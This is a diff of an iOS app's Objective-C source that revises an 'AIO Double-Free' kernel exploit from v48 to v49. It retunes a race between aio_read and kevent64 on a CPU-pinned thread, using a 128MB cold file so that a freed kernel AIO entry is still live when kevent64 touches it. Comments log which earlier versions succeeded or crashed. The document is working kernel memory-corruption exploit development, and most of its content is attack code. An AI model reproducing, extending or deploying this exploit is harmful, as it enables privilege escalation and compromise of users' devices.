@@ -247,9 +247,9 @@ struct aio_race_state {
     ssize_t return_result;  // v47: aio_return result or aio_read errno (diagnostics)
 };
 
-// v48: Single-threaded exploit state — no inter-thread sync needed.
+// v49: Single-threaded exploit state — no inter-thread sync needed.
 // Exploit thread on CPU 42 does all steps synchronously and stores results here.
-struct v48_state {
+struct v49_state {
     int fd;
     int kq;
     struct kevent64_s kev;
@@ -275,12 +275,12 @@ static void aio_set_thread_affinity(int tag) {
                       (thread_policy_t)&pol, THREAD_AFFINITY_POLICY_COUNT);
 }
 
-// v48: Single-threaded synchronous exploit — one thread on CPU 42 does
+// v49: Single-threaded synchronous exploit — one thread on CPU 42 does
 // aio_return→aio_read→kevent64 back-to-back. No inter-thread sync in
 // the critical path. ~0.55us from aio_read return to kevent64 syscall;
 // worker needs >100us for cold file read → we always win the race.
-static void *v48_exploit_thread(void *arg) {
-    struct v48_state *st = (struct v48_state *)arg;
+static void *v49_exploit_thread(void *arg) {
+    struct v49_state *st = (struct v49_state *)arg;
     aio_set_thread_affinity(42);
 
     int kq = kqueue();
@@ -299,14 +299,14 @@ static void *v48_exploit_thread(void *arg) {
     tcb.aio_sigevent.sigev_notify = SIGEV_KEVENT;
     tcb.aio_sigevent.sigev_signo = kq;
 
-    // rcb: 8KB at offset 1MB, SIGEV_NONE — cold read maximizes worker latency
+    // rcb: 8KB at offset 64MB, SIGEV_NONE — guaranteed cold (128MB file > buffer cache)
     struct aiocb rcb;
     char rbuf[8192];
     memset(&rcb, 0, sizeof(rcb));
     rcb.aio_fildes = st->fd;
     rcb.aio_buf = rbuf;
     rcb.aio_nbytes = sizeof(rbuf);
-    rcb.aio_offset = 1024 * 1024;
+    rcb.aio_offset = 64 * 1024 * 1024;
     rcb.aio_lio_opcode = LIO_READ;
     rcb.aio_sigevent.sigev_notify = SIGEV_NONE;
 
@@ -399,7 +399,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     UIButtonConfiguration *aioConf = [UIButtonConfiguration filledButtonConfiguration];
     aioConf.baseBackgroundColor = [UIColor systemOrangeColor];
     self.aioUafButton.configuration = aioConf;
-    [self.aioUafButton setTitle:@"AIO Double-Free v48" forState:UIControlStateNormal];
+    [self.aioUafButton setTitle:@"AIO Double-Free v49" forState:UIControlStateNormal];
     [self.aioUafButton addTarget:self action:@selector(aioUafTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.aioUafButton];
 
@@ -5785,7 +5785,7 @@ static void *e2_free_and_ool_racer(void *arg) {
         _aioLast = now;
     }
 
-    [self appendLog:@"\n========== AIO Double-Free v48 =========="];
+    [self appendLog:@"\n========== AIO Double-Free v49 =========="];
 
     // Disable button to prevent double-tap
     dispatch_async(dispatch_get_main_queue(), ^{
@@ -5804,49 +5804,52 @@ static void *e2_free_and_ool_racer(void *arg) {
         [self appendLog:@"FAIL: could not create temp file"];
         dispatch_async(dispatch_get_main_queue(), ^{
             self.aioUafButton.enabled = YES;
-            [self.aioUafButton setTitle:@"AIO Double-Free v48" forState:UIControlStateNormal];
+            [self.aioUafButton setTitle:@"AIO Double-Free v49" forState:UIControlStateNormal];
         });
         return;
     }
-    // v48: Use 2MB file so tcb(4KB@0) and rcb(8KB@1MB) hit different clusters.
-    // rcb offset=1MB guarantees cold read → >100us worker latency → we always win.
-    // Write 2MB in 64KB chunks to stay within dispatch queue stack (512KB limit).
+    // v49: Use 128MB file — exceeds buffer cache, guarantees rcb read is COLD.
+    // tcb(4KB@0) + rcb(8KB@64MB). 64MB offset ensures rcb data evicted from cache
+    // during file write → cold NVMe read >100us. Worker CANNOT finish before kevent64.
+    // Write in 256KB chunks (stack-safe, dispatch queue stack = 512KB).
     {
-        const size_t fsize = 2 * 1024 * 1024;
-        char chunk[65536];
+        const size_t fsize = 128 * 1024 * 1024;
+        char chunk[262144];  // 256KB
         memset(chunk, 'B', sizeof(chunk));
         for (size_t written = 0; written < fsize; written += sizeof(chunk)) {
             write(fd, chunk, sizeof(chunk));
         }
     }
-    [self appendLog:[NSString stringWithFormat:@"fd=%d file=2MB pid=%d uid=%d", fd, getpid(), getuid()]];
+    [self appendLog:[NSString stringWithFormat:@"fd=%d file=128MB pid=%d uid=%d", fd, getpid(), getuid()]];
 
-    // v48: SINGLE-THREADED SYNCHRONOUS — one thread on CPU 42 does everything.
-    // v44 (file-based, racer thread) WORKED: entry alive on workq, ext[1]=0x2000.
-    // v45-v46 FAILED: racer sync latency (~50-100us) let worker free entry first.
-    // v47 FAILED: pipe zfree zeros entries → procp=NULL → FAR=0x58.
+    // v49: SINGLE-THREADED SYNCHRONOUS — one thread on CPU 42 does everything.
+    // v44 WORKED (128MB cold file, racer sync). v45-v47 FAR=0x58 (sync latency / zfree).
+    // v48 FAR=0x58: 2MB cached → worker freed entry (refcount 1→0 via aio_entry_unref)
+    //                before kevent64. Entry was alive when aio_read returned, but worker
+    //                completed cached I/O in ~2us and freed it → zeroed → procp=0.
     //
-    // v48 SOLUTION: Dedicated thread pinned to CPU 42 executes ALL steps:
+    // v49 FIX: 128MB cold file + rcb@64MB. Cold NVMe read >100us. Our kevent64 fires
+    // in ~0.55us. Entry is ALIVE on workq when knote reads it → no crash.
     //   lio_listio(tcb) → aio_error wait → aio_return → aio_read(rcb) → kevent64
     // Zero inter-thread sync in critical path. ~0.55us from aio_read to kevent64;
     // cold file read forces worker latency >100us. We win the race every time.
 
     uint64_t entryAddr = 0;
 
-    // ---- Phase A v48: single-threaded synchronous on CPU 42 ----
-    [self appendLog:@"\n--- Phase A v48: single-threaded synchronous ---"];
+    // ---- Phase A v49: single-threaded synchronous on CPU 42 ----
+    [self appendLog:@"\n--- Phase A v49: single-threaded synchronous ---"];
 
     bool phaseA_won = false;
     for (int attempt = 0; attempt < 5; attempt++) {
         [self appendLog:[NSString stringWithFormat:@"  attempt %d/5", attempt + 1]];
 
-        struct v48_state st = {};
+        struct v49_state st = {};
         st.fd = fd;
         st.kq = -1;
         st.nev = -1;
 
         pthread_t thr;
-        pthread_create(&thr, NULL, v48_exploit_thread, &st);
+        pthread_create(&thr, NULL, v49_exploit_thread, &st);
         pthread_join(thr, NULL);
 
         if (st.err != 0) {
@@ -5891,12 +5894,12 @@ static void *e2_free_and_ool_racer(void *arg) {
         goto cleanup;
     }
 
-    // v48: Single-threaded approach eliminates inter-thread sync bottleneck.
+    // v49: Single-threaded approach eliminates inter-thread sync bottleneck.
     // Entry ALIVE on workq → no TAILQ_REMOVE → no FAR=0x58 crash.
     // ext[1]=8192 (rcb.aio_nbytes), ext[0]=0 (EINPROGRESS on workq).
 
-    // ---- Phase C v48: Health check ----
-    [self appendLog:@"\n--- Phase C v48: Health check ---"];
+    // ---- Phase C v49: Health check ----
+    [self appendLog:@"\n--- Phase C v49: Health check ---"];
     {
         struct aiocb hc[4];
         char hcbuf[4][256];
@@ -5922,11 +5925,11 @@ cleanup:
     close(fd);
     unlink(path.UTF8String);
     [self appendLog:[NSString stringWithFormat:@"=== uid=%d gid=%d ===", getuid(), getgid()]];
-    [self appendLog:@"========== AIO Double-Free v48 Complete =========="];
+    [self appendLog:@"========== AIO Double-Free v49 Complete =========="];
             _aioRunning = 0;
             dispatch_async(dispatch_get_main_queue(), ^{
                 self.aioUafButton.enabled = YES;
-                [self.aioUafButton setTitle:@"AIO Double-Free v48" forState:UIControlStateNormal];
+                [self.aioUafButton setTitle:@"AIO Double-Free v49" forState:UIControlStateNormal];
             });
         }  // @autoreleasepool
     });  // dispatch_async
